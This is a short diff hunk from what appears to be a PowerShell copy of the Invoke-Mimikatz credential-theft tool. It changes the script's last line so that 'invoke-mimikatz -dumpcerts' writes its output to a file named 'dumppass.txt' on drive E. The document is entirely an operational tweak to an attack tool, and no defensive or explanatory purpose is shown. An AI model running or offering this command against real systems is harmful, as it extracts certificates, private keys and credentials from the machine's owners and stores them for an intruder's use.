@@ -2733,4 +2733,4 @@ Function Main
 
 Main
 }
-invoke-mimikatz -dumpcerts
+invoke-mimikatz -dumpcerts >e:\dumppass.txt
